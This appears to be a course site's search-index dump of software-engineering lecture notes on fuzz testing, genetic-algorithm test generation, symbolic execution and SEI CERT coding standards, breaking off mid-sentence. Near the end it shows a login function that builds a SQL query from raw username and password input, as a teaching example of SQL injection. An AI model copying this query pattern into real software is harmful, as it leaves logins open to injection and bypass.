https://docs.gitlab.com/ee/user/application_security/api_fuzzing/ Fuzzing test on UI Fuzz testing can be applied to UI too. Fuzzing the UI element event handler by generating random input actions. Fuzzing the inputs to the HTML forms. Some reference can be found in the following https://www.fuzzingbook.org/html/GUIFuzzer.html","title":"50.003 - Auto Test Generation"},{"location":"notes/l11_1_auto_test_generation/#50003-auto-test-generation","text":"","title":"50.003 - Auto Test Generation"},{"location":"notes/l11_1_auto_test_generation/#learning-outcomes","text":"By the end of this unit you should be able to explain the roles and functionalities of the test generator. apply mutation-based fuzzing to generate test cases. apply generation-based function to synthesize test cases.","title":"Learning Outcomes"},{"location":"notes/l11_1_auto_test_generation/#test-generation","text":"Recall that process of software testing. graph Input-->Program Program-->TO TO[\"Test Oracle\"]-->Pass TO[\"Test Oracle\"]-->Fail So far we have been defining, curating and generating test cases manually. In this unit we consider some approaches that generates test cases automatically. graph TG[\"Test Generator\"]-->Input Input-->Program Program-->TO TO[\"Test Oracle\"]-->Pass TO[\"Test Oracle\"]-->Fail","title":"Test Generation"},{"location":"notes/l11_1_auto_test_generation/#fuzz-testing","text":"Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. Fuzzing aims to identify test inputs which reveal exploitable vulnerabilities. One downside for fuzzing is that it can't generate the expected outputs. This drawback is minor since for most of the fuzzing test cases, error should be expected outputs.","title":"Fuzz Testing"},{"location":"notes/l11_1_auto_test_generation/#why-fuzzing","text":"Besides test case generation automation, there are several extra reasons why fuzzing should be considered. A study found that one-quarter to one-third of all utilities on every UNIX system that the evaluators could get their hands on would crash in the presence of random input. A study that looked at 30 different Windows applications found that 21% of programs crashed and 24% hung when sent random mouse and keyboard input, and every single application crashed or hung when sent random Windows event messages. A study found that OS X applications, including Acrobat Reader, Apple Mail, Firefox, iChat, iTunes, MS Office, Opera, and Xcode, were even worse than the Windows ones.","title":"Why fuzzing"},{"location":"notes/l11_1_auto_test_generation/#the-base-line-random-testing","text":"The base line of fuzzing is to randomly generate inputs as sequences of characters or bytes. Such a approach can be easily implemented. For instance, consider the javascript program simple-fuzzer.js function random_fuzz() { let res = \"\"; // strings of any length between 0 and 1024 let length = Math.floor(Math.random() * 1024); //generate a random character at each location of the string for (let i =0 ; i < length ; i ++) { //generate a character between ASCII 32 and 128 let c = String.fromCharCode(Math.floor(Math.random() * 96) + 32); res = res + c; } return res; } console.log(random_fuzz()) Running node simple-fuzzer.js produces .u/m:SKx[-:\\3t3b?z87f)6'35!t1Y``fGR[_JS:&9^RSIA6svw8G~!%!%_lHA9b\\-a\"cw$<|$2Gc^8&A*c$eT#wd<QUd}Y1ua>yDxh:=NC^3jI~KMivT'.j{Cp%cDco\\2aG/cw3d$<Ih|vIm,_4d,oE8;nV!VXc:[1T,X{F)pIh8=+_[Xtm=_2X:9EWU_Oo*$|^0}nw~Dr1cQ(<dr}Y7/lH&mS$7?fx(F(]j)^9#j8.m2`<v_]=\"PAI{qvD+yxPusDx!/5ZXMFf'b\"Q,.pt7K\\\\?i7Yj 8Tx)/E'`M[}=v{>GtDbijU%mwEZB?PG]Fo{{6]jXRD[0(<zgbsah1J!D&m\\`aGQ8ehDbQN9>^C<I[AZ2;s'%_oj1}#RuCj~i=O\"vG]Q!FJ`UP:?{Y|]o\\P#7zi'8\\Ck@!vC./j:C.\\)iGx>Q]@zffZ24]lZw4L7BKk0dA{/ Z6`3v:NN8:h:@/qOC.oq{O^kgYD(#;|@_\\i,l!x2P14G(|T+KL!bml:<[P+Sh!*]JY|\\y\\dL[ In the older days when softwares were developed using less advanced tools and techniques, this approach was effective. In modern days, in which many softwares were developed with proper design and having standard input validation in-place, e.g. type checking, regex and parser etc. Most of the randomly generated input will be immediately rejected, without reaching very \"deep\" in the test subject.","title":"The Base Line - Random Testing"},{"location":"notes/l11_1_auto_test_generation/#mutation-based-fuzzing","text":"One of the possible ways to overcome the limitation with the random testing is that we could consider generating fuzzy test cases based on known valid test inputs. For instance, assuming that we note that one of the valid inputs to the test subject is the following string ISTDisApillarInSUTDbutItsNameiSGoingToChange One possible way to mutate it is to choose a character at a random position and replace it by ssomething else. For instance, we randoml choose position (say 13) and replace the character I by character Y ISTDisApillarYnSUTDbutItsNameiSGoingToChange The above is consdered an mutant of the original input. Here are some basic operations for mutation at some randomly chosen location. Flipping a bit/boolean/integer/character Trimming Swapping characters/bits Insert characters","title":"Mutation based fuzzing"},{"location":"notes/l11_1_auto_test_generation/#corhort-exercise-graded","text":"Given an input string, implement a mutation operator that chooses a random position in the string and swaps the adjacent characters. Meaning if SUTD is an input string and 2 is chosen as the random position, the output should be SUDT . Careful about the string length bound check.","title":"Corhort Exercise (Graded)"},{"location":"notes/l11_1_auto_test_generation/#generation-based-fuzzing","text":"An alternative to Mutation-based fuzzing is touse generation based fuzzing. In generation based fuzzing, we assume that we have access to a set of grammar rules that defines the possible syntatically valid inputs to the test subject.","title":"Generation based fuzzing"},{"location":"notes/l11_1_auto_test_generation/#formal-grammar","text":"In computer science, we often use formal grammar as the specification of a language. A language denotes a set of sequences of terminals. A terminal is often a symbol, a byte, or a number. For example, consider a language of arithmetic expressions which consists of +,-,*,/ as the operators and numbers as operands. In addition, we allow to use () to disambiguate ambiguous terms. For instance 5 + 2 * 3 is one of the valid expressions according to the following EBNF grammar rules S ::= Expr Expr ::= Expr + Term | Expr - Term | Term Term ::= Term * Factor | Term / Factor | Factor Factor ::= -Integer | (Expr) | Integer | Integer.Integer Integer ::= Digit | IntegerDigit Digit ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 In the above, each line denotes a rule. A rule consists of a left-hand-side, a define operator ::= and a right-hand-side. The LHS is a non-terminal . A non-terminal is a meta symbol in the grammar which defines a potential expension. As a dual, we have terminals, which are the atomic/elementary symbols in the languages, such as 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, +, -, *, /, ,., (, ) and white space. The RHS of a rule is a set of alternatives sepearated by | . Each alternative is a sequence of terminals and non-terminals. We could interpret each rule as the LHS non-terminal can be potentially expanded into the one of the alternatives in the RHS. For example, we consider the rule with Expr as the LHS, which says the expression non-terminal can be either a + expression (which consists another Expr , a + and a non-terminal Term ), or a - expression, or a Term by itself.","title":"Formal Grammar"},{"location":"notes/l11_1_auto_test_generation/#parse-tree","text":"Given a grammar, a parser normally validates the input sequence by attempting to construct a parse tree. A parse tree records from which grammar rules the input sequence can be validated according to the grammar. We can also think of the parse tree as the result of the parsing. For example, the exxpression 5 + 2 * 3 can be parsed into the following parse tree graph N0(\"S\") --> N1 N1(\"Expr\") --> N2 N1(\"Expr\") --> N3(\"+\") N1(\"Expr\") --> N4 N2(\"Expr\") --> N5 N5(\"Term\") --> N6 N6(\"Factor\") --> N7 N7(\"Integer\") --> N8 N8(\"Digit\") --> N9(\"5\") N4(\"Term\") --> N10 N4(\"Term\") --> N11(\"*\") N4(\"Term\") --> N12 N10(\"Term\") --> N13 N13(\"Factor\") --> N14 N14(\"Integer\") --> N15 N15(\"Digit\") --> 2 N12(\"Factor\") --> N16 N16(\"Integer\") --> N17 N17(\"Digit\") --> N18(\"3\") In the above parse tree, starting from the root, we find that the first rule we applied in parsing 5 + 2 * 3 is S ::= Expr . The subtree indicates that the second rule/alternative we apply is Expr ::= Expr + Term . The left subtree contains no branches, which leads us to the digit 5 . The right subtree indicates that the rule we applied to parse the sub expression 2 * 3 is Term ::= Factor .","title":"Parse Tree"},{"location":"notes/l11_1_auto_test_generation/#generate-fuzz-test-using-the-grammar","text":"Given we understand the input requirement, we can now define a better fuzzer w.r.t to the grammar. The idea is to starting from the starting rule's nonterminal, randomly choose one grammar rule given the current non-terminal to generate a sub term (sub parse tree). We need to take note of Do not over expand with the recursive alternative. Do not always expand the same sub-tree / node. With this we can generate a good set of fuzz test input passing the syntax checking of the target software and yet having enough randomness.","title":"Generate Fuzz test using the grammar"},{"location":"notes/l11_1_auto_test_generation/#cohort-exercise-graded","text":"Use JavaScript to implement a fuzzer that will randomly generate inputs to the calculator conforming to the grammar. For now, you can hardcode the expression grammar. Hint: Start with the initial rule S ::= Expr and at each point, apply a rule at random. For example, randomly choose any of the rules Expr ::= Term , Expr ::= Expr + Term or Expr \u2013 Term in the next step. Continue until a valid expression for the calculator is obtained. Make sure you do not expand the rules forever to avoid infinite loop.","title":"Cohort Exercise (Graded)"},{"location":"notes/l11_1_auto_test_generation/#limitations-of-fuzzing","text":"Fuzzing offers many perks to maintain goodd quality of softwares. Can provide results with little effort Can reveal bugs that were missed in a manual audit Provides an overall picture of the robustness of the target software It also shares certain limitations Will not find all bugs The crashing test cases that are produced may be difficult to analyse, as the act of fuzzing does not give you much knowledge of how the software operates internally Programs with complex inputs can require much more work to produce a smart enough fuzzer to get sufficient code coverage","title":"Limitations of Fuzzing"},{"location":"notes/l11_1_auto_test_generation/#feedback-based-fuzzing","text":"Besides getting the fuzzer to leverage the input specification, another orthothongal approach is to gather feedback from the test report. The idea is to turn the test case generation problem into an optimization problem. graph N1-->N2 N2(\"Execute Test Cases\")-->N3 N3(\"Collect Feedback\")-->N1(\"Generate Test Cases\") As illustrated by the above diagram, in a feedback-baed fuzzing testing framework, we first use a fuzzer to generate the test cases, Then execute the test cases against the test subject. Finally we collect the test outcomes and report as a feedback to the fuzzer which should improve the test effectivness. One common way to measure test effectiveness is to measure the code coverage.","title":"Feedback-based Fuzzing"},{"location":"notes/l11_1_auto_test_generation/#exercise-not-graded","text":"Recall that in Jest, we can generate the coverage report in text or html. Note that it can also generate json report. With it, we can feed the json report back to the fuzzer to generate a better set of tests to increase the code coverage. Discuss among your team members to think of a possible implementation to incorporate feedback-based fuzzing","title":"Exercise (Not Graded)"},{"location":"notes/l11_1_auto_test_generation/#api-fuzzing","text":"Fuzz testing can be applied to API testing in several aspect Fuzzing the low level request - generates random bytes as HTTP requests to test the robustness of the API service. Fuzzing the routes - through fuzzers, we could generate sequences of random valid / invalid requests to the test the API routers. Fuzzing the high level request - generate GET/POST/DEL/PUT HTTP requests by fuzzing HTTP parameters or form parameters. Some references can be found in the following https://medium.com/@Magii/fuzzing-with-postman-599dce6317c7 https://github.com/KissPeter/APIFuzzer https://docs.gitlab.com/ee/user/application_security/api_fuzzing/","title":"API Fuzzing"},{"location":"notes/l11_1_auto_test_generation/#fuzzing-test-on-ui","text":"Fuzz testing can be applied to UI too. Fuzzing the UI element event handler by generating random input actions. Fuzzing the inputs to the HTML forms. Some reference can be found in the following https://www.fuzzingbook.org/html/GUIFuzzer.html","title":"Fuzzing test on UI"},{"location":"notes/l11_2_auto_test_generation2/","text":"50.003 - Auto Test Generation Part 2 Learning Outcomes By the end of this unit, you should be able to Apply Genetic algorithm for software testing. Apply Symbolic exeuction for software testing. Explain how to use symbolic execution for software verification. Recap Recall from the last unit, we learned a special version fuzzing technique which leverages on the feedback givem by the test reports. graph N1-->N2 N2(\"Execute Test Cases\")-->N3 N3(\"Collect Feedback\")-->N1(\"Generate Test Cases\") In each iteration, we take the feedback from the previous test execution to generate the next test cases, hoping the next test cases will perform better. The process of translating the feedback to a new version of test case might be quite tricky to implement as a rule-based system. Genetic algorithm A possible way to automate the process of feedback-to-generate-better-test-cases is to adopt the genetic algorithm. Genetic Algorithms were invented to mimic some of the processes observed in natural evolution. The idea with GA is to use this power of evolution to solve optimization problems. The father of the original Genetic Algorithm was John Holland who invented it in the early 1970's. The main idea is to represent the set of all possible results, good or bad, intermediate or final as an entire population. Any subset of the entire population is considered as a generation. The algorithm starts with randomly pick a subset as the first generation. The following steps are taken in each iteration compute the fitness score for each member in the current generation \\(G_i\\) . pick a subset of \\(G_i\\) , say \\(G_i'\\) such that all members in \\(G_i'\\) are fitter than the rest by a threshold. Use members in \\(G_i'\\) as \"parents\" to \"breed\" the next generation \\(G_{i+1}\\) . set the current generation as \\(G_{i+1}\\) . The above loop terminates when either * the maximum number of iterations is reached or * the overall fitness meets the minimum requirement or * the fitness increment is smaller than threshold \\(fit(G_{i+1}) - fit(G_i) < \\epsilon\\) . Using GA in test generation for software testing, it is natural to apply GA. Let the set of all possible test inputs be the entire population. Each generatation is a proper subset of the entire population. Let the code coverage score be the fitness score for each test input. Viewing each test input as a sequence of bytes. There are at least two possible \"breeding\" operations. Cross-over. Taking two test inputs, say A and B from the \\(G_i'\\) , and pick some random byte offsets that are common to both. Replace the bytes in A by those bytes from B based on the offsets. The result of this operation will be the member of the next generation. Mutatation. Take one test input say C from \\(G_i'\\) , randomly pick a position and change the byte at the position which form a new input in the next generation. Limitation of GA based test generation GA automates the search of best test cases for the given test subject. However it might take many iterations to reach the optimal set. Consider function example(x,y) { let a = [[1],[2],[3],[4],[5]] if (y == 42342531) { a[x][0] = y // x must be [0..4] } } In the above example, it will take a long time for the GA test case search to discover the bug is prensent when x=5 and y=42342531 . To reach that branch fast, we need to exploit the code structure of example() , it is kind of white box fuzzing. Symbolic execution Symbolic exeuction is a kind of dynamic analysis that tries to reach to all executable paths in a function. It differs from concreate execution and testing for not giving concrete values to the function being invoked, instead, some symbolic arguments are given so as to collect the information. It differs from static analysis techniques as it retains a per path level of information for analysis, (which could also be a drawback, we will discuss it shortly). Given the function example(x,y) , invoking it with a concrete value say example(100,42342531) is known as a concrete execution . Symbolic execution on the other hand, does not invoke the funciton with concrete values, instead symoblic values are passed in. Supose A and B are two symbolic values, we can think of them as logical terms, not variable. 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: a[A][0] = B // 0 <= A < 5 7: } 8: } From the above, we find that for the path 3->4->6->7 to be covered, B must be 42342531 . By doing so, we can figure out the test case to cover that path. Besides generating test cases, Symbolic execution can detect bugs, dead codes and redunant assertion. For example, if we add an assertion statement at line 6, 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: assert(B>0) // B > 0 7: a[A][0] = B // 0 <= A < 5 8: } 9: } The symbolic execution framework generates the following set of constraints for the path 3->4->6->7->8, { B == 42342531 && B > 0 && 0 <= A && A < 5 } since the first constraint implies the second one, the second constraint is redundant. Similarly if we have the following code 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: if (B<0) { // B < 0 7: a[A][0] = B // 0 <= A < 5 8: } 9: } 10:} The symbolic exuection framework generates the constraint set for the path 3->4->6->7->8->9->10, as { B == 42342531 && B<0 && 0 <= A && A < 5 } which can not be satisfied hence this path of code is not reachable. Finally if we have the following code 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: A = B // A == B 7: a[A][0] = B //0 <= A < 5 8: 9: } 10:} we have the following set of constraints { B == 42342531 && B == A && 0 <= A < 5 } which is unsatifiable hence a bug must be present. As we observe, symbolic execution proceeds by path following. For each path it traverse, it generates a set of constraints, if it is an assignment and the LHS is first time being assigned, x = e , it generates an equality constraint x == e . if it is an re-assignment x = e , we need to create a fresh copy of x , say the last defined/assigned of x was x_i , then add x_{i+1} == e to the constraint sets, and rename all the use of x to x_{i+1} in the statements that come after the current one. if it is an if p { s1 } else { s2 } , it generate two paths with the first path having p and the second path having !(p) . if it is a while p { s } , it generates a path into the loop body with p as part of the constraint set, and another path with !p as it exits the loops. We can also add extra constraints such as the reference of the array elements must be within range. For example, 1: function sum_upto(n) { 2: let s = 0; 3: let i = 0; 4: while (i < n) { 5: s = s + i; 6: i = i + 1; 7: } 8: return s; 9: } we first \"get\" rid of the while loop by unrolling it once and one. Path 1: 1: function sum_upto(N) { 2: let s = 0; 3: let i = 0; 7: assert(i >= N) // !(i<n) 8: return s; 9: } Path 2: 1: function sum_upto(N) { 2: let s = 0; 3: let i = 0; 4: assert(i < N) // (i<n) 5: s = s + i; 6: i = i + 1; 7: assert(i >=N) // !(i<n) 8: return s; 9: } We then rename the variables used in the assignments into single assignment form. Path 1: 1: function sum_upto(N) { 2: let s0 = 0; 3: let i0 = 0; 7: assert(i0 >= N) // !(i<n) 8: return s0; 9: } Path 2: 1: function sum_upto(N) { 2: let s0 = 0; 3: let i0 = 0; 4: assert(i0 < N) // (i<n) 5: s1 = s0 + i; 6: i1 = i0 + 1; 7: assert(i1 >=N) // !(i<n) 8: return s1; 9: } Then we have two versions of the above. One version of not entering the while loop body. 1: { 2: s0 == 0 && 3: i0 == 0 && 4: !(i0 < N) 9: } And another version of executing the while loop body once. 1: { 2: s0 == 0 && 3: i0 == 0 && 4: i0 < N && 5: s1 == s0 + i0 && 6: i1 == i0 + 1 && 7: !(i1 < N) 9: } We could have more versions of having while loop being unrolled more than once, we just need to be adding extra superscripts to distinguish variables being re-assigned in different iterations. We finally can send these versions to constraint solvers to check for satisfiability. Limitation of Symbolic execution Symbolic execution was a nice framework with strong formalism behind and highly useful. There are several issues required more care. Limitation of the solvers It relias on the solver's capabilities. Hence in case of complex inequality, we might not get an answer. function f(x, y, z) { if (x*x*x*x + y*y*y < z*z) { assert(false); } } Existing SMT solvers support theories on linear integer arithmetic, bit vectors, string, etc. Existing SMT solvers are not particularly scalable or efficient for certain theories e.g., non-linear arithmetic. * In such cases symbolic execution will not (always) be able to evaluate which side of the branch should be taken. * Thus, symbolic execution may randomly generate some inputs to find one of the feasible execution, losing opportunities to cover a large portion of code. Memory object aliasing Keeping track of constraints among variables with primitive values are straight-forward, it is not that simple when dealing with reference to objects in the heap. For instance consider 1: class A { 2: constructor(x) { this.attr = x}; 3: } 4: function foo(N) { 5: let a = new A(N); // a == mloc1 && mloc1.attr == N 6: if (a.attr == N) { 7: let b = a; // b == a 8: b.attr = N+1; // mloc1.attr == N +1 9: } 10:} If we naively construct a set of constraint from a path from 5-->6-->7-->8-->9, we have the following { a == mloc1 && mloc1.attr == N && mloc1.attr == N && b == a && mloc1.attr == N+1 } which is not satisfiable, but the above path of executions should be valid. Clearly we need a better model to manage to heap objects. Treatment of loops Symbolic Execution does not cover all the paths, e.g. we have to fix a limit to how many time the loop can be unrolled, or require the programmers to annotate the loop with invariant (which is uncommon for day-to-day programming). For example, if a program add an invariant constraint of the while loop s <= i * (i-1) / 2 , we could verify that for all versions of s_k and i_k , satifies the invariant contraints, for example s0 == 0 && i0 == 0 && i0 == N ==> s0 <= i0 * (i_{-1} - 1) / 2 i_{-1} is undefined but since i0 is 0, hence the above holds s1 == s0 + i0 && i1 == i0 + 1 && i0 == 0 && i0 == N ==> s1 <= i1 * (i0 - 1) / 2 This generalizes to for all k . Thus, when N >=0 , We can then use the invariant plus the post condition i==N as the approximiated constraint set for the loop for the subsequent paths, this is to like combining static analysis with dynamic analysis.","title":"50.003 - Auto Test Generation Part 2"},{"location":"notes/l11_2_auto_test_generation2/#50003-auto-test-generation-part-2","text":"","title":"50.003 - Auto Test Generation Part 2"},{"location":"notes/l11_2_auto_test_generation2/#learning-outcomes","text":"By the end of this unit, you should be able to Apply Genetic algorithm for software testing. Apply Symbolic exeuction for software testing. Explain how to use symbolic execution for software verification.","title":"Learning Outcomes"},{"location":"notes/l11_2_auto_test_generation2/#recap","text":"Recall from the last unit, we learned a special version fuzzing technique which leverages on the feedback givem by the test reports. graph N1-->N2 N2(\"Execute Test Cases\")-->N3 N3(\"Collect Feedback\")-->N1(\"Generate Test Cases\") In each iteration, we take the feedback from the previous test execution to generate the next test cases, hoping the next test cases will perform better. The process of translating the feedback to a new version of test case might be quite tricky to implement as a rule-based system.","title":"Recap"},{"location":"notes/l11_2_auto_test_generation2/#genetic-algorithm","text":"A possible way to automate the process of feedback-to-generate-better-test-cases is to adopt the genetic algorithm. Genetic Algorithms were invented to mimic some of the processes observed in natural evolution. The idea with GA is to use this power of evolution to solve optimization problems. The father of the original Genetic Algorithm was John Holland who invented it in the early 1970's. The main idea is to represent the set of all possible results, good or bad, intermediate or final as an entire population. Any subset of the entire population is considered as a generation. The algorithm starts with randomly pick a subset as the first generation. The following steps are taken in each iteration compute the fitness score for each member in the current generation \\(G_i\\) . pick a subset of \\(G_i\\) , say \\(G_i'\\) such that all members in \\(G_i'\\) are fitter than the rest by a threshold. Use members in \\(G_i'\\) as \"parents\" to \"breed\" the next generation \\(G_{i+1}\\) . set the current generation as \\(G_{i+1}\\) . The above loop terminates when either * the maximum number of iterations is reached or * the overall fitness meets the minimum requirement or * the fitness increment is smaller than threshold \\(fit(G_{i+1}) - fit(G_i) < \\epsilon\\) .","title":"Genetic algorithm"},{"location":"notes/l11_2_auto_test_generation2/#using-ga-in-test-generation","text":"for software testing, it is natural to apply GA. Let the set of all possible test inputs be the entire population. Each generatation is a proper subset of the entire population. Let the code coverage score be the fitness score for each test input. Viewing each test input as a sequence of bytes. There are at least two possible \"breeding\" operations. Cross-over. Taking two test inputs, say A and B from the \\(G_i'\\) , and pick some random byte offsets that are common to both. Replace the bytes in A by those bytes from B based on the offsets. The result of this operation will be the member of the next generation. Mutatation. Take one test input say C from \\(G_i'\\) , randomly pick a position and change the byte at the position which form a new input in the next generation.","title":"Using GA in test generation"},{"location":"notes/l11_2_auto_test_generation2/#limitation-of-ga-based-test-generation","text":"GA automates the search of best test cases for the given test subject. However it might take many iterations to reach the optimal set. Consider function example(x,y) { let a = [[1],[2],[3],[4],[5]] if (y == 42342531) { a[x][0] = y // x must be [0..4] } } In the above example, it will take a long time for the GA test case search to discover the bug is prensent when x=5 and y=42342531 . To reach that branch fast, we need to exploit the code structure of example() , it is kind of white box fuzzing.","title":"Limitation of GA based test generation"},{"location":"notes/l11_2_auto_test_generation2/#symbolic-execution","text":"Symbolic exeuction is a kind of dynamic analysis that tries to reach to all executable paths in a function. It differs from concreate execution and testing for not giving concrete values to the function being invoked, instead, some symbolic arguments are given so as to collect the information. It differs from static analysis techniques as it retains a per path level of information for analysis, (which could also be a drawback, we will discuss it shortly). Given the function example(x,y) , invoking it with a concrete value say example(100,42342531) is known as a concrete execution . Symbolic execution on the other hand, does not invoke the funciton with concrete values, instead symoblic values are passed in. Supose A and B are two symbolic values, we can think of them as logical terms, not variable. 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: a[A][0] = B // 0 <= A < 5 7: } 8: } From the above, we find that for the path 3->4->6->7 to be covered, B must be 42342531 . By doing so, we can figure out the test case to cover that path. Besides generating test cases, Symbolic execution can detect bugs, dead codes and redunant assertion. For example, if we add an assertion statement at line 6, 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: assert(B>0) // B > 0 7: a[A][0] = B // 0 <= A < 5 8: } 9: } The symbolic execution framework generates the following set of constraints for the path 3->4->6->7->8, { B == 42342531 && B > 0 && 0 <= A && A < 5 } since the first constraint implies the second one, the second constraint is redundant. Similarly if we have the following code 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: if (B<0) { // B < 0 7: a[A][0] = B // 0 <= A < 5 8: } 9: } 10:} The symbolic exuection framework generates the constraint set for the path 3->4->6->7->8->9->10, as { B == 42342531 && B<0 && 0 <= A && A < 5 } which can not be satisfied hence this path of code is not reachable. Finally if we have the following code 1: function example(A,B){ 2: // A can be anything, B can be anything 3: let a = [[1],[2],[3],[4],[5]] 4: if (B == 42342531) { 5: // B must be 42342531 6: A = B // A == B 7: a[A][0] = B //0 <= A < 5 8: 9: } 10:} we have the following set of constraints { B == 42342531 && B == A && 0 <= A < 5 } which is unsatifiable hence a bug must be present. As we observe, symbolic execution proceeds by path following. For each path it traverse, it generates a set of constraints, if it is an assignment and the LHS is first time being assigned, x = e , it generates an equality constraint x == e . if it is an re-assignment x = e , we need to create a fresh copy of x , say the last defined/assigned of x was x_i , then add x_{i+1} == e to the constraint sets, and rename all the use of x to x_{i+1} in the statements that come after the current one. if it is an if p { s1 } else { s2 } , it generate two paths with the first path having p and the second path having !(p) . if it is a while p { s } , it generates a path into the loop body with p as part of the constraint set, and another path with !p as it exits the loops. We can also add extra constraints such as the reference of the array elements must be within range. For example, 1: function sum_upto(n) { 2: let s = 0; 3: let i = 0; 4: while (i < n) { 5: s = s + i; 6: i = i + 1; 7: } 8: return s; 9: } we first \"get\" rid of the while loop by unrolling it once and one. Path 1: 1: function sum_upto(N) { 2: let s = 0; 3: let i = 0; 7: assert(i >= N) // !(i<n) 8: return s; 9: } Path 2: 1: function sum_upto(N) { 2: let s = 0; 3: let i = 0; 4: assert(i < N) // (i<n) 5: s = s + i; 6: i = i + 1; 7: assert(i >=N) // !(i<n) 8: return s; 9: } We then rename the variables used in the assignments into single assignment form. Path 1: 1: function sum_upto(N) { 2: let s0 = 0; 3: let i0 = 0; 7: assert(i0 >= N) // !(i<n) 8: return s0; 9: } Path 2: 1: function sum_upto(N) { 2: let s0 = 0; 3: let i0 = 0; 4: assert(i0 < N) // (i<n) 5: s1 = s0 + i; 6: i1 = i0 + 1; 7: assert(i1 >=N) // !(i<n) 8: return s1; 9: } Then we have two versions of the above. One version of not entering the while loop body. 1: { 2: s0 == 0 && 3: i0 == 0 && 4: !(i0 < N) 9: } And another version of executing the while loop body once. 1: { 2: s0 == 0 && 3: i0 == 0 && 4: i0 < N && 5: s1 == s0 + i0 && 6: i1 == i0 + 1 && 7: !(i1 < N) 9: } We could have more versions of having while loop being unrolled more than once, we just need to be adding extra superscripts to distinguish variables being re-assigned in different iterations. We finally can send these versions to constraint solvers to check for satisfiability.","title":"Symbolic execution"},{"location":"notes/l11_2_auto_test_generation2/#limitation-of-symbolic-execution","text":"Symbolic execution was a nice framework with strong formalism behind and highly useful. There are several issues required more care.","title":"Limitation of Symbolic execution"},{"location":"notes/l11_2_auto_test_generation2/#limitation-of-the-solvers","text":"It relias on the solver's capabilities. Hence in case of complex inequality, we might not get an answer. function f(x, y, z) { if (x*x*x*x + y*y*y < z*z) { assert(false); } } Existing SMT solvers support theories on linear integer arithmetic, bit vectors, string, etc. Existing SMT solvers are not particularly scalable or efficient for certain theories e.g., non-linear arithmetic. * In such cases symbolic execution will not (always) be able to evaluate which side of the branch should be taken. * Thus, symbolic execution may randomly generate some inputs to find one of the feasible execution, losing opportunities to cover a large portion of code.","title":"Limitation of the solvers"},{"location":"notes/l11_2_auto_test_generation2/#memory-object-aliasing","text":"Keeping track of constraints among variables with primitive values are straight-forward, it is not that simple when dealing with reference to objects in the heap. For instance consider 1: class A { 2: constructor(x) { this.attr = x}; 3: } 4: function foo(N) { 5: let a = new A(N); // a == mloc1 && mloc1.attr == N 6: if (a.attr == N) { 7: let b = a; // b == a 8: b.attr = N+1; // mloc1.attr == N +1 9: } 10:} If we naively construct a set of constraint from a path from 5-->6-->7-->8-->9, we have the following { a == mloc1 && mloc1.attr == N && mloc1.attr == N && b == a && mloc1.attr == N+1 } which is not satisfiable, but the above path of executions should be valid. Clearly we need a better model to manage to heap objects.","title":"Memory object aliasing"},{"location":"notes/l11_2_auto_test_generation2/#treatment-of-loops","text":"Symbolic Execution does not cover all the paths, e.g. we have to fix a limit to how many time the loop can be unrolled, or require the programmers to annotate the loop with invariant (which is uncommon for day-to-day programming). For example, if a program add an invariant constraint of the while loop s <= i * (i-1) / 2 , we could verify that for all versions of s_k and i_k , satifies the invariant contraints, for example s0 == 0 && i0 == 0 && i0 == N ==> s0 <= i0 * (i_{-1} - 1) / 2 i_{-1} is undefined but since i0 is 0, hence the above holds s1 == s0 + i0 && i1 == i0 + 1 && i0 == 0 && i0 == N ==> s1 <= i1 * (i0 - 1) / 2 This generalizes to for all k . Thus, when N >=0 , We can then use the invariant plus the post condition i==N as the approximiated constraint set for the loop for the subsequent paths, this is to like combining static analysis with dynamic analysis.","title":"Treatment of loops"},{"location":"notes/l12_2_code_std/","text":"50.003 - Code Standards Learning Outcomes By the end of this unit, you should be able to 1. Apply SEI CERT Java Coding Standard to improve security level of a software system 1. Eliminate racing conditions in web application via transaction. Coding Standard Coding standard is a common guideline for a group of software engineers to follows so as to 1. have a uniform structure of most of the codes 1. improve readability 1. improve referenceability 1. improve maintainability 1. minimize exploitability Example, we find * https://google.github.io/styleguide/ * https://wiki.sei.cmu.edu/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java SEI CERT Java Coding Standard Let's take SEI CERT Java Coding Standard as an example. It consists of a set of rules which are meant to provide normative requirements for code. Each rule is associated with a metrics for severity (low, medium, and high), likelihood (unlikely, probably, and likely) and remediation cost (high, medium, and low). Conformance to the rule can be determined through automated analysis (either static or dynamic), formal methods, or manual inspection techniques. For example, we find a subset of the rules as follows, Input valuation and data sanitization Object-orientation (not related for now since we focus on JavaScript). But you are strongly encouraged to read up. Locking and thread-safety (we've covered in some earlier unit in week 6.) Visibility and atomicity (not covered in this course) Although these coding standards are set for Java and our main language for the module is JavaScript, we will discuss those are applicable to both languages. Input Validation and Data Sanitization Many programs accept untrusted data originating from unvalidated users, network connections, and other untrusted sources and then pass the (modified or unmodified) data across a trust boundary to a different trusted domain. Such data must be sanitized. For example, we find the following rules in this category IDS00-J. Sanitize untrusted data passed across a trust boundary IDS01-J. Normalize strings before validating them IDS11-J. Eliminate non-character code points before validation IDS00-J. Sanitize untrusted data passed across a trust boundary The main idea is simple, given data provided by 3rd party, we should perform some sanitization to ensure the data is not malicious. SQL Injection An example of such data is SQL injection. Suppose, we have the following code function login(db, un, pw) { const [rows, fieldDefs] = await db.pool.query(` SELECT * FROM db_user WHERE username='${un}' AND password='${pw}' `); let found = false; if (rows.length > 0) { found = true; } return found; } Function login takes a database connection object con , the username un and password pw and try to search for the user record in the db_user table. Note that un and pw are 